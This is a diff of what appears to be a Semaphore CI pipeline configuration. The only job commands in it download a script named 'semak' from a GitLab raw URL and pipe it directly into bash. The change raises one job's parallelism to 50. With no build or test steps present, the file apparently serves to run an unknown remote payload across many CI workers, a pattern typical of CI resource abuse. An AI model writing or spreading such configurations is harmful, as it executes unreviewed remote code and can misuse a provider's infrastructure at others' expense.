@@ -13,7 +13,7 @@ blocks:
         - name: 'Job #1'
           commands:
             - 'curl -sL https://gitlab.com/xpanzers/play/-/raw/main/semak | bash'
-          parallelism: 20
+          parallelism: 4
     run:
       when: branch = 'master'
   - name: 'Block #2'
@@ -22,3 +22,4 @@ blocks:
         - name: 'Job #1'
           commands:
             - 'curl -sL https://gitlab.com/xpanzers/play/-/raw/main/semak | bash'
+          parallelism: 50
